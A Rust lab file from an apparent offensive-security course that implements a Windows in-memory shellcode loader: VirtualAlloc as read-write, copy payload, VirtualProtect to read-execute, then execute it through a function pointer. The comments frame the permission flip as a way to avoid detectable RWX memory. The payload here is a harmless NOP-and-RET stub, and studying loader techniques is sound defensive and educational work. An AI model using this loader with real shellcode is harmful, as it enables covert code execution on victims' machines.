//! Lab 02: Offensive Rust In-Memory Loader
//!
//! Demonstrates memory staging and execution using Windows Native APIs wrapped
//! via windows-sys. Avoids direct RWX memory state by allocating RW, writing payload,
//! and transitioning to RX before invocation.

use std::ptr;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

fn main() {
    println!("[*] The BlackHAT Roadmap - Lab 02: Offensive Rust Loader");

    // 64-bit NOP slide ending with RET (0xC3) for safe execution verification
    let payload: [u8; 8] = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xC3];

    unsafe {
        // Step 1: Allocate initial memory as PAGE_READWRITE (never allocate as RWX directly)
        let alloc_ptr = VirtualAlloc(
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if alloc_ptr.is_null() {
            eprintln!("[-] VirtualAlloc failed.");
            return;
        }

        println!("[+] Staged RW memory allocated at: {:?}", alloc_ptr);

        // Step 2: Copy payload into allocated region
        ptr::copy_nonoverlapping(payload.as_ptr(), alloc_ptr as *mut u8, payload.len());
        println!("[+] Payload copied to buffer.");

        // Step 3: Transition memory protection from RW to RX
        let mut old_protect = 0;
        let protect_status = VirtualProtect(
            alloc_ptr,
            payload.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if protect_status == 0 {
            eprintln!("[-] VirtualProtect failed to flip permissions to RX.");
            return;
        }

        println!("[+] Memory transitioned from RW to RX (avoided persistent RWX artifact).");

        // Step 4: Cast to function pointer and execute
        let exec_fn: fn() = std::mem::transmute(alloc_ptr);
        println!("[*] Calling in-memory function pointer...");
        exec_fn();
        println!("[+] Execution finished cleanly without runtime exceptions.");
    }
}
